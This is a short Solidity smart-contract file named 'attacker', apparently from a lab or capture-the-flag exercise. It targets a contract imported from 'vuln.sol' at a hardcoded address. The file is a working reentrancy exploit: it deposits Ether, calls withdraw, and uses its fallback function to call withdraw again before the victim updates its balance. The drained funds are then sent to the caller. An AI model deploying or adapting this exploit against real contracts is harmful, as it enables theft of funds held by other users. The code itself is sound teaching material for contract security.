pragma solidity ^0.5.0;

import "./vuln.sol";

contract attacker {
    Vuln obj = Vuln(address(0x5b95C5afF4bc9907C692b9c5a789311F513b217e));
    uint256 public balance = 0;
    uint256 public count = 0;

    function attk_withdraw() payable public{
        balance += msg.value;
        obj.deposit.value(msg.value)();
        balance -= msg.value;
        obj.withdraw();
        msg.sender.transfer(address(this).balance);
        count = 0;
    }
    
   
    function () external payable {
        if(count < 1) { count++;  obj.withdraw(); balance += msg.value;}
    }
}